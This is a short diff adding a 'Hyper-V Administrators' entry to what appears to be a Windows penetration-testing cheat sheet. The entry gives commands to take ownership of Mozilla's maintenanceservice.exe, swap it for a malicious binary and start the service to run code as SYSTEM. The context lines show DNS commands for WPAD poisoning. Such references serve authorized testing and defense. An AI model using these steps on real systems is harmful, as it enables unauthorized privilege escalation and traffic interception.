@@ -2574,6 +2574,16 @@ PS C:\> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName <hostname
 PS C:\> Add-DnsServerResourceRecordA -Name wpad -ZoneName <domain> -ComputerName <hostname> -IPv4Address <IP address>
 ```
 
+- Hyper-V Administrators
+
+```
+https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/
+https://github.com/decoder-it/Hyper-V-admin-EOP
+C:\> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
+# Replace this file with a malicious maintenanceservice.exe, start the maintenance service, and get command execution as SYSTEM
+C:\> sc.exe start MozillaMaintenance
+```
+
 #6. - Persistence
 -----------------------------------------
 
